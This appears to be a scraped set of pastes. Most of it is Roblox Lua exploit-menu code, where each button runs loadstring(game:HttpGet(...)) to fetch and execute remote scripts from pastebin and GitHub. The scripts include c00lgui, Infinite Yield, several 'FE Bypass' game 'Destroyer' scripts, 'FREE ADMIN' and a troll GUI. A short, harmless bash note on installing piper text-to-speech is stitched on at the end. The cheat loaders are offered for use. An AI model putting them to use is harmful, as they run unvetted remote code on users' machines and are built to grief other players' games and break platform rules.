UIGradient_4.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(0.46, Color3.fromRGB(198, 198, 198)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
UIGradient_4.Parent = TextButton_4
TextButton_5.Parent = ScrollingFrame
TextButton_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_5.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_5.BorderSizePixel = 0
TextButton_5.Size = UDim2.new(0, 126, 0, 58)
TextButton_5.Font = Enum.Font.FredokaOne
TextButton_5.Text = ""KCS""
TextButton_5.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_5.TextSize = 25.000
TextButton_5.TextWrapped = true
UICorner_6.CornerRadius = UDim.new(0, 15)
UICorner_6.Parent = TextButton_5
UIGradient_5.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(0.46, Color3.fromRGB(198, 198, 198)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
UIGradient_5.Parent = TextButton_5
TextButton_6.Parent = ScrollingFrame
TextButton_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_6.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_6.BorderSizePixel = 0
TextButton_6.Size = UDim2.new(0, 126, 0, 58)
TextButton_6.Font = Enum.Font.FredokaOne
TextButton_6.Text = ""SB ~ ZXN""
TextButton_6.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_6.TextSize = 25.000
TextButton_6.TextWrapped = true
UICorner_7.CornerRadius = UDim.new(0, 15)
UICorner_7.Parent = TextButton_6
UIGradient_6.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(0.46, Color3.fromRGB(198, 198, 198)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
UIGradient_6.Parent = TextButton_6
TextButton_7.Parent = ScrollingFrame
TextButton_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_7.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_7.BorderSizePixel = 0
TextButton_7.Size = UDim2.new(0, 126, 0, 58)
TextButton_7.Font = Enum.Font.FredokaOne
TextButton_7.Text = ""CLS""
TextButton_7.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_7.TextSize = 25.000
TextButton_7.TextWrapped = true
UICorner_8.CornerRadius = UDim.new(0, 15)
UICorner_8.Parent = TextButton_7
UIGradient_7.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(0.46, Color3.fromRGB(198, 198, 198)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
UIGradient_7.Parent = TextButton_7
TextButton_8.Parent = ScrollingFrame
TextButton_8.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_8.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_8.BorderSizePixel = 0
TextButton_8.Size = UDim2.new(0, 126, 0, 58)
TextButton_8.Font = Enum.Font.FredokaOne
TextButton_8.Text = ""BS""
TextButton_8.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_8.TextSize = 25.000
TextButton_8.TextWrapped = true
UICorner_9.CornerRadius = UDim.new(0, 15)
UICorner_9.Parent = TextButton_8
UIGradient_8.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(0.46, Color3.fromRGB(198, 198, 198)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
UIGradient_8.Parent = TextButton_8
TextButton_9.Parent = ScrollingFrame
TextButton_9.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_9.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_9.BorderSizePixel = 0
TextButton_9.Size = UDim2.new(0, 126, 0, 58)
TextButton_9.Font = Enum.Font.FredokaOne
TextButton_9.Text = ""C0RPKIDD""
TextButton_9.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_9.TextSize = 25.000
TextButton_9.TextWrapped = true
UICorner_10.CornerRadius = UDim.new(0, 15)
UICorner_10.Parent = TextButton_9
UIGradient_9.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(0.46, Color3.fromRGB(198, 198, 198)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
UIGradient_9.Parent = TextButton_9
TextButton_10.Parent = ScrollingFrame
TextButton_10.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_10.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_10.BorderSizePixel = 0
TextButton_10.Size = UDim2.new(0, 126, 0, 58)
TextButton_10.Font = Enum.Font.FredokaOne
TextButton_10.Text = ""PL UI""
TextButton_10.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_10.TextSize = 25.000
TextButton_10.TextWrapped = true
UICorner_11.CornerRadius = UDim.new(0, 15)
UICorner_11.Parent = TextButton_10
UIGradient_10.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(0.46, Color3.fromRGB(198, 198, 198)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
UIGradient_10.Parent = TextButton_10
TextButton_11.Parent = ScrollingFrame
TextButton_11.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_11.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_11.BorderSizePixel = 0
TextButton_11.Size = UDim2.new(0, 126, 0, 58)
TextButton_11.Font = Enum.Font.FredokaOne
TextButton_11.Text = ""GTH 2""
TextButton_11.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_11.TextSize = 25.000
TextButton_11.TextWrapped = true
UICorner_12.CornerRadius = UDim.new(0, 15)
UICorner_12.Parent = TextButton_11
UIGradient_11.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(0.46, Color3.fromRGB(198, 198, 198)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
UIGradient_11.Parent = TextButton_11
TextButton_12.Parent = ScrollingFrame
TextButton_12.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_12.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_12.BorderSizePixel = 0
TextButton_12.Size = UDim2.new(0, 126, 0, 58)
TextButton_12.Font = Enum.Font.FredokaOne
TextButton_12.Text = ""GTH""
TextButton_12.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_12.TextSize = 25.000
TextButton_12.TextWrapped = true
UICorner_13.CornerRadius = UDim.new(0, 15)
UICorner_13.Parent = TextButton_12
UIGradient_12.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(0.46, Color3.fromRGB(198, 198, 198)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
UIGradient_12.Parent = TextButton_12
TextButton_13.Parent = ScrollingFrame
TextButton_13.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_13.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_13.BorderSizePixel = 0
TextButton_13.Size = UDim2.new(0, 126, 0, 58)
TextButton_13.Font = Enum.Font.FredokaOne
TextButton_13.Text = ""KH""
TextButton_13.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_13.TextSize = 25.000
TextButton_13.TextWrapped = true
UICorner_14.CornerRadius = UDim.new(0, 15)
UICorner_14.Parent = TextButton_13
UIGradient_13.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(0.46, Color3.fromRGB(198, 198, 198)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
UIGradient_13.Parent = TextButton_13
TextButton_14.Parent = ScrollingFrame
TextButton_14.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_14.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_14.BorderSizePixel = 0
TextButton_14.Size = UDim2.new(0, 126, 0, 58)
TextButton_14.Font = Enum.Font.FredokaOne
TextButton_14.Text = ""GTH 3""
TextButton_14.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_14.TextSize = 25.000
TextButton_14.TextWrapped = true
UICorner_15.CornerRadius = UDim.new(0, 15)
UICorner_15.Parent = TextButton_14
UIGradient_14.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(0.46, Color3.fromRGB(198, 198, 198)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
UIGradient_14.Parent = TextButton_14
TextButton_15.Parent = ScrollingFrame
TextButton_15.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_15.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_15.BorderSizePixel = 0
TextButton_15.Size = UDim2.new(0, 126, 0, 58)
TextButton_15.Font = Enum.Font.FredokaOne
TextButton_15.Text = ""XXX hub""
TextButton_15.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_15.TextSize = 25.000
TextButton_15.TextWrapped = true
UICorner_16.CornerRadius = UDim.new(0, 15)
UICorner_16.Parent = TextButton_15
UIGradient_15.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(0.46, Color3.fromRGB(198, 198, 198)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
UIGradient_15.Parent = TextButton_15
TextButton_16.Parent = ScrollingFrame
TextButton_16.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_16.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_16.BorderSizePixel = 0
TextButton_16.Size = UDim2.new(0, 126, 0, 58)
TextButton_16.Font = Enum.Font.FredokaOne
TextButton_16.Text = ""flood-r hub""
TextButton_16.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_16.TextSize = 25.000
TextButton_16.TextWrapped = true
UICorner_17.CornerRadius = UDim.new(0, 15)
UICorner_17.Parent = TextButton_16
UIGradient_16.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(0.46, Color3.fromRGB(198, 198, 198)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
UIGradient_16.Parent = TextButton_16
UIGradient_17.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(0.46, Color3.fromRGB(198, 198, 198)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
UIGradient_17.Rotation = 45
UIGradient_17.Parent = Frame
local function PZFMGE_fake_script() -- TextButton.LocalScript 
	local script = Instance.new('LocalScript', TextButton)

	local TweenService = game:GetService(""TweenService"")
	local button = script.Parent
	local fadeGroup = button.Parent.Parent
	local destroyTarget = fadeGroup
	local fadeTime = 1
	local function tweenUITransparency(uiObject)
		local props = {}
		if uiObject:IsA(""Frame"") or uiObject:IsA(""TextButton"") or uiObject:IsA(""TextLabel"") or uiObject:IsA(""ImageButton"") or uiObject:IsA(""ImageLabel"") then
			if uiObject:IsA(""TextLabel"") or uiObject:IsA(""TextButton"") then
				props.TextTransparency = 1
			end
			if uiObject:IsA(""ImageLabel"") or uiObject:IsA(""ImageButton"") then
				props.ImageTransparency = 1
			end
			props.BackgroundTransparency = 1
			local tween = TweenService:Create(uiObject, TweenInfo.new(fadeTime), props)
			tween:Play()
		end
	end
	local function fadeUIGroup(group)
		for _, descendant in pairs(group:GetDescendants()) do
			tweenUITransparency(descendant)
		end
	end
	button.MouseButton1Click:Connect(function()
		fadeUIGroup(fadeGroup)
		task.wait(fadeTime)
		destroyTarget:Destroy()
	end)
end
coroutine.wrap(PZFMGE_fake_script)()
local function DKGW_fake_script() -- TextButton_2.Script 
	local script = Instance.new('Script', TextButton_2)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
	end)
end
coroutine.wrap(DKGW_fake_script)()
local function VXKQQD_fake_script() -- TextButton_3.Script 
	local script = Instance.new('Script', TextButton_3)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet(""https://pastebin.com/raw/jpx7sKJe""))()
	end)
end
coroutine.wrap(VXKQQD_fake_script)()
local function WSPNUE_fake_script() -- TextButton_4.Script 
	local script = Instance.new('Script', TextButton_4)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/vertex-peak/vertex/refs/heads/main/loadstring'))()
	end)
end
coroutine.wrap(WSPNUE_fake_script)()
local function YGQGX_fake_script() -- TextButton_5.Script 
	local script = Instance.new('Script', TextButton_5)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet('https://pastebin.com/raw/XfssS3aD'))()
	end)
end
coroutine.wrap(YGQGX_fake_script)()
local function KLUPI_fake_script() -- TextButton_6.Script 
	local script = Instance.new('Script', TextButton_6)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet('https://pastebin.com/raw/egXiCLBf'))()
	end)
end
coroutine.wrap(KLUPI_fake_script)()
local function SBJPWJ_fake_script() -- TextButton_7.Script 
	local script = Instance.new('Script', TextButton_7)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet('https://pastebin.com/raw/hmEGLEDw'))()
	end)
end
coroutine.wrap(SBJPWJ_fake_script)()
local function UNUQ_fake_script() -- TextButton_8.Script 
	local script = Instance.new('Script', TextButton_8)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet('https://pastebin.com/raw/Fja2nhyP'))()
	end)
end
coroutine.wrap(UNUQ_fake_script)()
local function MLVGR_fake_script() -- TextButton_9.Script 
	local script = Instance.new('Script', TextButton_9)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet('https://pastebin.com/raw/GmaBxan9'))()
	end)
end
coroutine.wrap(MLVGR_fake_script)()
local function DCTFLPJ_fake_script() -- TextButton_10.Script 
	local script = Instance.new('Script', TextButton_10)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet('https://pastebin.com/raw/H9KTAsFm'))()
	end)
end
coroutine.wrap(DCTFLPJ_fake_script)()
local function NIRIQRO_fake_script() -- TextButton_11.Script 
	local script = Instance.new('Script', TextButton_11)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet('https://pastebin.com/raw/YZtqvSi2'))()
	end)
end
coroutine.wrap(NIRIQRO_fake_script)()
local function ZLGQS_fake_script() -- TextButton_12.Script 
	local script = Instance.new('Script', TextButton_12)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet('https://pastebin.com/raw/mcLD9Tbe'))()
	end)
end
coroutine.wrap(ZLGQS_fake_script)()
local function FAUEZB_fake_script() -- TextButton_13.Script 
	local script = Instance.new('Script', TextButton_13)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet('https://pastebin.com/raw/p3gFzFGF'))()
	end)
end
coroutine.wrap(FAUEZB_fake_script)()
local function UWHGU_fake_script() -- TextButton_14.Script 
	local script = Instance.new('Script', TextButton_14)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet('https://pastebin.com/raw/rPp3y1uq'))()
	end)
end
coroutine.wrap(UWHGU_fake_script)()
local function SRXVDG_fake_script() -- TextButton_15.Script 
	local script = Instance.new('Script', TextButton_15)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet('https://pastebin.com/raw/rPp3y1uq'))()
	end)
end
coroutine.wrap(SRXVDG_fake_script)()
local function UNJV_fake_script() -- TextButton_16.Script 
	local script = Instance.new('Script', TextButton_16)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet('https://pastebin.com/raw/rPp3y1uq'))()
	end)
end
coroutine.wrap(UNJV_fake_script)()
local function YNXISM_fake_script() -- Frame.UIDrag 
	local script = Instance.new('LocalScript', Frame)

	-- Made by Real_IceyDev (@lceyDex) --
	-- Simple UI dragger (PC Only/Any device that has a mouse) --
	
	local UIS = game:GetService('UserInputService')
	local frame = script.Parent
	local dragToggle = nil
	local dragSpeed = 0.25
	local dragStart = nil
	local startPos = nil
	
	local function updateInput(input)
		local delta = input.Position - dragStart
		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
	end
	
	frame.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
			dragToggle = true
			dragStart = input.Position
			startPos = frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)
	
	UIS.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if dragToggle then
				updateInput(input)
			end
		end
	end)
end
coroutine.wrap(YNXISM_fake_script)()"
5ipB7UBb,c00lgui,GREGORIAH_lol,Lua,Thursday 29th of May 2025 12:44:06 AM CDT,"local c00lgui = Window:Creat
eTab(""c00lgui"", nil) -- Title, Image
local c00lguiSection = c00lgui:CreateSection(""c00lgui"")
local Button = c00lgui:CreateButton({
   Name = ""c00lgui v2.2 by team c00lkidd"",
   Callback = function()loadstring(game:HttpGet(""https://raw.githubusercontent.com/theawesomari0/c00lgui/66033e8ff67eccc421fb04b3924e42d4adf3d7a2/c00lgui%20v2.2?subid1=20230826-2047-4399-8bd3-612370889e32"",true))()
   end,
})
local Button = c00lgui:CreateButton({
   Name = ""Destroyer GUI"",
   Callback = function()
        loadstring(game:HttpGet(""https://raw.githubusercontent.com/MiRw3b/c00lgui-v3rx/main/c00lguiv3rx.lua"",true))()
   end,
})
local Button = c00lgui:CreateButton({
   Name = ""c00lgui reborn v0.5"",
   Callback = function()
        loadstring(game:GetObjects(""rbxassetid://8127297852"")[1].Source)()
   end,
})
local feTab = Window:CreateTab(""Fe Bypass"", nil) -- Title, Image
local feSection = feTab:CreateSection(""Fe Bypass"")
local Paragraph = feTab:CreateParagraph({Title = ""NOTICE"", Content = ""Some FE script can doesn't work if they don't work contact me FireServiceScripter#1073 on discord""})
local Button = feTab:CreateButton({
   Name = ""FE GAMEPASS UI"",
   Callback = function()
        loadstring(game:HttpGet('https://pastebin.com/raw/QtQ4YnVR'))()
   end,
})
local Button = feTab:CreateButton({
   Name = ""FE Twilight Daycare Destroyer"",
   Callback = function()
        loadstring(game:HttpGet('https://gist.githubusercontent.com/dark-modz/46b122bee4a227eca1355a56ebff0cd3/raw/1a1eb29f7eb7153a718986afb379d2786c420fab/OPtwilightdaycareGUI'))(' Watermelon ? ')
   end,
})
local Button = feTab:CreateButton({
   Name = ""FE Build And Survive Destroyer"",
   Callback = function()
        loadstring(game:HttpGet('https://pastebin.com/raw/LgfZbBVy'))()
   end,
})
local Button = feTab:CreateButton({
   Name = ""FE Bypassing Hub GUI"",
   Callback = function()
        loadstring(game:HttpGet(""https://raw.githubusercontent.com/RealMrQuacks/AuratusX/master/Load""))()
   end,
})
local Button = feTab:CreateButton({
   Name = ""FE Tools Drop [FREE ADMIN]"",
   Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/brownfieldd00/Roblox/main/Games/FREE%20ADMIN.lua'))()
   end,
})
local Button = feTab:CreateButton({
   Name = ""FE Troll GUI"",
   Callback = function()
        loadstring(game:HttpGet(""https://raw.githubusercontent.com/GetYoScript/Aayus/main/Sick""))()
   end,
})
local Button = feTab:CreateButton({
   Name = ""FE Btools"",
   Callback = function()
        loadstring(game:HttpGet('https://pastebin.com/raw/WaqDDa8v'))()
    end,
})
local Button = feTab:CreateButton({
   Name = ""FE Hub Script [Best]"",
   Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Dvrknvss/UniversalFEScriptHub/main/Script'))()
   end,
})
local Executors = Window:CreateTab(""Executors"", nil) -- Title, Image
local ExSection = Executors:CreateSection(""RC7"")
local Button = Executors:CreateButton({
   Name = ""RC7"",
   Callback = function()
        loadstring(game:HttpGet(""https://raw.githubusercontent.com/CoreGui/Scripts/main/RC7""))()
   end,
})"
Wk65ZzKb,Better Text to Speech with piper,metalx1000,Bash,Wednesday 28th of May 2025 07:53:18 PM CDT,"# Better text to speech with piper
# https://github.com/rhasspy/piper

# get piper
wget ""https://github.com/rhasspy/piper/releases/download/v1.2.0/piper_amd64.tar.gz""
tar xzvf piper_amd64.tar.gz
cd piper

# get voice models
# https://github.com/rhasspy/piper/blob/master/VOICES.md
wget ""https://huggingface.co/rhasspy/piper-voices/resolve/v1.0.0/en/en_GB/alan/medium/en_GB-alan-medium.onnx""
wget ""https://huggingface.co/rhasspy/piper-voices/resolve/v1.0.0/en/en_GB/alan/medium/en_GB-alan-medium.onnx.json""

# Play the audio from text
echo 'This sentence is spoken first. This sentence is synthesized while the first sentence is spoken.' | ./piper --model en_GB-alan-medium.onnx --output-raw | aplay -r 24000 -f S16_LE -t raw -

"
